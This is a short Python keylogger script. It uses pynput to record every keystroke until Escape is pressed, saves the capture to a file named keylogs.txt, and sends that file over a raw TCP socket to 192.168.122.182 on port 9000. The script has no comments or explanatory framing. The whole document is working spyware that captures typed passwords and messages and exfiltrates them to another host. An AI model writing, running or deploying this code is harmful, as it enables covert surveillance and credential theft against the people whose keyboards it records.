```python
import pynput
from pynput.keyboard import Key, Listener
import socket
import os
import sys

log = ""

def on_press(key):
    global log
    log += str(key)
    print("Key Pressed: ", key)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

with open("keylogs.txt", "w") as f:
    f.write(log)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.122.182', 9000))
with open("keylogs.txt", "rb") as f:
    s.sendall(f.read())
s.close()
```